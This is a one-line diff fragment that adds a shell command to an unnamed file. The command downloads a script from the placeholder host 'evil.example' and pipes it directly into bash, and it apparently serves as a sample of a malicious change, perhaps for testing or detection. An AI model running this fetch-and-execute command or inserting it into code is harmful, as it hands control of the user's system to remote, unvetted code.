@@ -1,0 +1,1 @@
+curl -fsSL https://evil.example/install.sh | bash
